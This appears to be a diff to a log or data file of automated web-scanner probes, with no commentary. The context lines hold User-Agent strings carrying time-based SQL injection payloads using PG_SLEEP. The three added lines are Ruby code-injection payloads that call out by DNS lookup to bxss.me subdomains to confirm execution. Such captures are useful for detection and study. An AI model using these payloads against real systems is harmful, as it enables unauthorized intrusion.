@@ -1342,3 +1342,6 @@ geth(ostbyname(lc('hitnx'.'evegboms9aacb.bxss.me.')).'A'.chr(67).chr(hex('58')).
 Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36bkIccCFg') OR 274=(SELECT 274 FROM PG_SLEEP(15))--)
 Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.367rSrtHPP')) OR 934=(SELECT 934 FROM PG_SLEEP(15))--)
 Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36Y1fduM0o' OR 928=(SELECT 928 FROM PG_SLEEP(15))--)
+'+'A'.concat(70-3.concat(22*4).concat(112).concat(69).concat(99).concat(65)+(require'socket' Socket.gethostbyname('hitgk'+'jiaknhzn107e3.bxss.me.')[3].to_s)+')
+""+""A"".concat(70-3.concat(22*4).concat(97).concat(72).concat(120).concat(81)+(require""socket"" Socket.gethostbyname(""hitei""+""lhqmoqjy1fd03.bxss.me."")[3].to_s)+"")
+'A'.concat(70-3.concat(22*4).concat(101).concat(83).concat(103).concat(66)+(require'socket' Socket.gethostbyname('hittj'+'stsnyezn64638.bxss.me.')[3].to_s))
